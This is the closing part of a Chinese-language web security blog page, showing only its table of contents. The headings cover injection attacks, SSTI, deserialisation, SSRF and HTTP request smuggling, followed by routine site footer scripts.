href="#HTTP-%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">7.3.1.</span> <span class="toc-text">HTTP 头注入</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5"><span class="toc-number">7.4.</span> <span class="toc-text">最佳实践</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E6%96%B9%E9%9D%A2"><span class="toc-number">7.4.1.</span> <span class="toc-text">代码方面</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%82%E6%95%B0%E5%8C%96%E6%9F%A5%E8%AF%A2%E5%92%8C%E9%A2%84%E5%A4%84%E7%90%86%E8%AF%AD%E5%8F%A5"><span class="toc-number">7.4.1.1.</span> <span class="toc-text">参数化查询和预处理语句</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BE%93%E5%85%A5%E6%A0%A1%E9%AA%8C%E5%92%8C%E5%A4%84%E7%90%86"><span class="toc-number">7.4.1.2.</span> <span class="toc-text">输入校验和处理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9C%80%E5%B0%8F%E6%9D%83%E9%99%90%E5%8E%9F%E5%88%99"><span class="toc-number">7.4.1.3.</span> <span class="toc-text">最小权限原则</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">7.4.1.4.</span> <span class="toc-text">存储过程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9A%E6%9C%9F%E5%AE%89%E5%85%A8%E5%AE%A1%E8%AE%A1%E5%92%8C%E4%BB%A3%E7%A0%81%E5%AE%A1%E6%9F%A5"><span class="toc-number">7.4.1.5.</span> <span class="toc-text">定期安全审计和代码审查</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SQL-%E6%B3%A8%E5%85%A5%E9%AB%98%E7%BA%A7%E6%8A%80%E5%B7%A7"><span class="toc-number">7.4.2.</span> <span class="toc-text">SQL 注入高级技巧</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%89%B9%E5%AE%9A%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8A%9F%E8%83%BD"><span class="toc-number">7.4.2.1.</span> <span class="toc-text">利用特定数据库功能</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%AF%A6%E7%BB%86%E9%94%99%E8%AF%AF%E4%BF%A1%E6%81%AF"><span class="toc-number">7.4.2.2.</span> <span class="toc-text">利用详细错误信息</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87-WAF-%E5%92%8C%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">7.4.2.3.</span> <span class="toc-text">绕过 WAF 和过滤器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8C%87%E7%BA%B9%E8%AF%86%E5%88%AB"><span class="toc-number">7.4.2.4.</span> <span class="toc-text">数据库指纹识别</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-SQL-%E6%B3%A8%E5%85%A5%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="toc-number">7.4.2.5.</span> <span class="toc-text">利用 SQL 注入进行内网渗透</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#NO-SQL"><span class="toc-number">8.</span> <span class="toc-text">NO SQL</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#No-SQL-%E6%B3%A8%E5%85%A5"><span class="toc-number">8.1.</span> <span class="toc-text">No SQL 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%B1%BB%E5%9E%8B"><span class="toc-number">8.1.1.</span> <span class="toc-text">注入类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C%E7%AC%A6%E6%B3%A8%E5%85%A5"><span class="toc-number">8.2.</span> <span class="toc-text">操作符注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POST-%E8%AF%B7%E6%B1%82%E4%BC%A0%E6%95%B0%E7%BB%84"><span class="toc-number">8.2.1.</span> <span class="toc-text">POST 请求传数组</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AF%AD%E6%B3%95%E6%B3%A8%E5%85%A5"><span class="toc-number">8.3.</span> <span class="toc-text">语法注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E7%8E%B0%E6%B3%A8%E5%85%A5"><span class="toc-number">8.3.1.</span> <span class="toc-text">发现注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%AA%8C%E8%AF%81%E6%B3%A8%E5%85%A5"><span class="toc-number">8.3.2.</span> <span class="toc-text">验证注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%B3%A8%E5%85%A5"><span class="toc-number">8.3.3.</span> <span class="toc-text">利用注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XXE-%E6%B3%A8%E5%85%A5"><span class="toc-number">9.</span> <span class="toc-text">XXE 注入</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%A6%E5%A4%96-XXE"><span class="toc-number">9.1.</span> <span class="toc-text">带外 XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF-XXE"><span class="toc-number">9.2.</span> <span class="toc-text">SSRF + XXE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%8E%AA%E6%96%BD"><span class="toc-number">9.3.</span> <span class="toc-text">缓解措施</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5-1"><span class="toc-number">9.3.1.</span> <span class="toc-text">最佳实践</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Server-side-Template-Injection"><span class="toc-number">10.</span> <span class="toc-text">Server-side Template Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8C%BA%E5%88%86%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E"><span class="toc-number">10.1.</span> <span class="toc-text">区分模板引擎</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-Smarty"><span class="toc-number">10.1.1.</span> <span class="toc-text">PHP - Smarty</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NodeJS-Pug"><span class="toc-number">10.1.2.</span> <span class="toc-text">NodeJS - Pug</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="toc-number">10.1.2.1.</span> <span class="toc-text">关键漏洞点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Payload"><span class="toc-number">10.1.2.2.</span> <span class="toc-text">利用 Payload</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Python-Jinja2"><span class="toc-number">10.1.3.</span> <span class="toc-text">Python - Jinja2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">10.2.</span> <span class="toc-text">自动化利用工具</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%91%E6%88%98"><span class="toc-number">10.3.</span> <span class="toc-text">挑战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#LDAP-%E6%B3%A8%E5%85%A5"><span class="toc-number">11.</span> <span class="toc-text">LDAP 注入</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Injects"><span class="toc-number">12.</span> <span class="toc-text">Injects</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Insecure-Deserialisation"><span class="toc-number">13.</span> <span class="toc-text">Insecure Deserialisation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%89%B4%E5%88%AB"><span class="toc-number">13.1.</span> <span class="toc-text">鉴别</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%BD%E8%AE%BF%E9%97%AE%E5%88%B0%E6%BA%90%E7%A0%81"><span class="toc-number">13.1.1.</span> <span class="toc-text">能访问到源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E5%88%B0%E6%BA%90%E7%A0%81"><span class="toc-number">13.1.2.</span> <span class="toc-text">不能访问到源码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%93%8D%E5%BA%94"><span class="toc-number">13.1.2.1.</span> <span class="toc-text">分析服务器响应</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%A3%80%E6%9F%A5-Cookie"><span class="toc-number">13.1.2.2.</span> <span class="toc-text">检查 Cookie</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%87%AA%E5%8A%A8%E5%8C%96%E8%84%9A%E6%9C%AC"><span class="toc-number">13.2.</span> <span class="toc-text">自动化脚本</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHPGGC"><span class="toc-number">13.2.1.</span> <span class="toc-text">PHPGGC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7"><span class="toc-number">13.2.2.</span> <span class="toc-text">Java 反序列化利用工具</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#SSRF"><span class="toc-number">14.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A1%A5%E6%95%91%E6%8E%AA%E6%96%BD"><span class="toc-number">14.1.</span> <span class="toc-text">补救措施</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#File-Inclusion-Path-Traversal"><span class="toc-number">15.</span> <span class="toc-text">File Inclusion, Path Traversal</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-Wrappers"><span class="toc-number">15.1.</span> <span class="toc-text">PHP Wrappers</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-Wrapper"><span class="toc-number">15.1.1.</span> <span class="toc-text">Data Wrapper</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LFI2CE-Session-Files"><span class="toc-number">15.2.</span> <span class="toc-text">LFI2CE - Session Files</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Prototype-Pollution"><span class="toc-number">16.</span> <span class="toc-text">Prototype Pollution</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Include"><span class="toc-number">17.</span> <span class="toc-text">Include</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CORS-SOP"><span class="toc-number">18.</span> <span class="toc-text">CORS &amp; SOP</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CORS"><span class="toc-number">18.1.</span> <span class="toc-text">CORS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CORS-%E4%B8%AD%E4%B8%8D%E5%90%8C%E7%9A%84-HTTP-%E5%A4%B4"><span class="toc-number">18.1.1.</span> <span class="toc-text">CORS 中不同的 HTTP 头</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Request-Smuggling"><span class="toc-number">19.</span> <span class="toc-text">HTTP Request Smuggling</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%B0%E4%BB%A3%E5%9F%BA%E6%9E%B6"><span class="toc-number">19.1.</span> <span class="toc-text">现代基架</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E5%AD%98%E6%9C%BA%E5%88%B6%E7%9A%84%E8%81%8C%E8%B4%A3"><span class="toc-number">19.1.1.</span> <span class="toc-text">缓存机制的职责</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E8%AF%B7%E6%B1%82%E5%A4%B4"><span class="toc-number">19.2.</span> <span class="toc-text">HTTP 请求头</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-Request-Smuggling-Origin"><span class="toc-number">19.2.1.</span> <span class="toc-text">HTTP Request Smuggling Origin</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8D%E5%90%8C%E7%B1%BB%E5%9E%8B%E7%9A%84%E5%81%B7%E6%B8%A1"><span class="toc-number">19.3.</span> <span class="toc-text">不同类型的偷渡</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#CL-TE"><span class="toc-number">19.3.1.</span> <span class="toc-text">CL.TE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%8D%E6%AD%A3%E7%A1%AE%E7%9A%84-CL"><span class="toc-number">19.3.2.</span> <span class="toc-text">不正确的 CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-CL"><span class="toc-number">19.3.3.</span> <span class="toc-text">TE.CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TE-TE"><span class="toc-number">19.3.4.</span> <span class="toc-text">TE.TE</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Walkthrough"><span class="toc-number">19.4.</span> <span class="toc-text">Walkthrough</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">19.5.</span> <span class="toc-text">总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%93%E8%A7%A3%E6%96%B9%E6%B3%95"><span class="toc-number">19.5.1.</span> <span class="toc-text">缓解方法</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-2-Request-Smuggling"><span class="toc-number">20.</span> <span class="toc-text">HTTP&#x2F;2 Request Smuggling</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-2"><span class="toc-number">20.1.</span> <span class="toc-text">HTTP&#x2F;2</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Request-Smuggling-and-HTTP-2"><span class="toc-number">20.1.1.</span> <span class="toc-text">Request Smuggling and HTTP&#x2F;2</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-2-Desync"><span class="toc-number">20.2.</span> <span class="toc-text">HTTP&#x2F;2 Desync</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-2-Downgrading"><span class="toc-number">20.2.1.</span> <span class="toc-text">HTTP&#x2F;2 Downgrading</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%A2%84%E6%9C%9F%E8%A1%8C%E4%B8%BA"><span class="toc-number">20.2.2.</span> <span class="toc-text">预期行为</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-CL"><span class="toc-number">20.2.2.1.</span> <span class="toc-text">H2.CL</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#H2-TE"><span class="toc-number">20.2.2.2.</span> <span class="toc-text">H2.TE</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CRLF-injection"><span class="toc-number">20.2.2.3.</span> <span class="toc-text">CRLF injection</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">20.3.</span> <span class="toc-text">利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#H2-CL-1"><span class="toc-number">20.3.1.</span> <span class="toc-text">H2.CL</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Leaking-Internal-Headers"><span class="toc-number">20.3.2.</span> <span class="toc-text">Leaking Internal Headers</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Bypassing-Frontend-Restrictions"><span class="toc-number">20.3.3.</span> <span class="toc-text">Bypassing Frontend Restrictions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Web-Cache-Poisoning-%E7%BC%93%E5%AD%98%E6%8A%95%E6%AF%92"><span class="toc-number">20.3.4.</span> <span class="toc-text">Web Cache Poisoning 缓存投毒</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#H2c-%E8%B5%B0%E7%A7%81"><span class="toc-number">20.4.</span> <span class="toc-text">H2c 走私</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-%E7%89%88%E6%9C%AC%E5%8D%8F%E5%95%86"><span class="toc-number">20.4.1.</span> <span class="toc-text">HTTP 版本协商</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7%E5%88%B0-h2c"><span class="toc-number">20.4.2.</span> <span class="toc-text">升级到 h2c</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB"><span class="toc-number">20.5.</span> <span class="toc-text">推荐阅读</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%95%AA%E5%A4%96"><span class="toc-number">20.6.</span> <span class="toc-text">番外</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-1-1-%E8%B5%B0%E7%A7%81%E7%9A%84%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0"><span class="toc-number">20.6.1.</span> <span class="toc-text">HTTP&#x2F;1.1 走私的根本原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#HTTP-2-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3%E8%BF%99%E4%B8%AA%E9%97%AE%E9%A2%98"><span class="toc-number">20.6.2.</span> <span class="toc-text">HTTP&#x2F;2 如何解决这个问题</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Request-Smuggling-WebSockets"><span class="toc-number">21.</span> <span class="toc-text">Request Smuggling: WebSockets</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E-HTTP-%E5%8D%87%E7%BA%A7%E5%88%B0-Websockets"><span class="toc-number">21.1.</span> <span class="toc-text">从 HTTP 升级到 Websockets</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%9C%89%E7%BC%BA%E9%99%B7%E7%9A%84-WebSocket-%E9%9A%A7%E9%81%93%E8%B5%B0%E7%A7%81-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-number">21.2.</span> <span class="toc-text">通过有缺陷的 WebSocket 隧道走私 HTTP 请求</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E4%BB%A3%E7%90%86%E9%99%90%E5%88%B6"><span class="toc-number">21.3.</span> <span class="toc-text">绕过代理限制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E2%80%9D%E5%AE%89%E5%85%A8%E2%80%9C%E7%9A%84%E4%BB%A3%E7%90%86"><span class="toc-number">21.4.</span> <span class="toc-text">绕过”安全“的代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8E%A8%E8%8D%90%E9%98%85%E8%AF%BB-1"><span class="toc-number">21.5.</span> <span class="toc-text">推荐阅读</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#HTTP-Browser-Desync"><span class="toc-number">22.</span> <span class="toc-text">HTTP Browser Desync</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%8E%BB%E5%90%8C%E6%AD%A5%E6%BC%8F%E6%B4%9E%E9%93%BE-XSS"><span class="toc-number">22.1.</span> <span class="toc-text">HTTP 浏览器去同步漏洞链 XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8C%91%E6%88%98-1"><span class="toc-number">22.2.</span> <span class="toc-text">挑战</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#El-Bandito"><span class="toc-number">23.</span> <span class="toc-text">El Bandito</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E9%98%B6%E6%AE%B5"><span class="toc-number">23.1.</span> <span class="toc-text">信息收集阶段</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-1"><span class="toc-number">23.2.</span> <span class="toc-text">Step 1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BE%E5%88%87%E5%85%A5%E7%82%B9"><span class="toc-number">23.2.1.</span> <span class="toc-text">找切入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">23.2.2.</span> <span class="toc-text">补充</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#trace-%E7%AB%AF%E7%82%B9%E7%9A%84%E4%BD%9C%E7%94%A8"><span class="toc-number">23.2.2.1.</span> <span class="toc-text">&#x2F;trace 端点的作用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Step-2"><span class="toc-number">23.3.</span> <span class="toc-text">Step 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96-1"><span class="toc-number">23.4.</span> <span class="toc-text">其他</span></a></li></ol></li></ol>
                </div>
            </button>
            

            

            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
        </div>
    </div>
</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="搜索" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
</div><!-- hexo injector body_end start -->
  <script>
  const CODE_CONFIG = {
    beautify: undefined,
    highlightCopy: undefined,
    highlightLang: undefined,
    highlightHeightLimit: undefined,
    isHighlightShrink: undefined,
    copy: {
      success: 'undefined',
      error: 'undefined',
      noSupport: 'undefined',
    }
  };
  console.log(
    `%c hexo-shiki-plugin %c v1.0.27 %c https://github.com/nova1751/hexo-shiki-plugin`,
    "color: #fff; background: #5f5f5f",
    "color: #fff; background: #80c8f8",
    ""
  );
  </script>
  <!-- hexo injector body_end end --></body></html>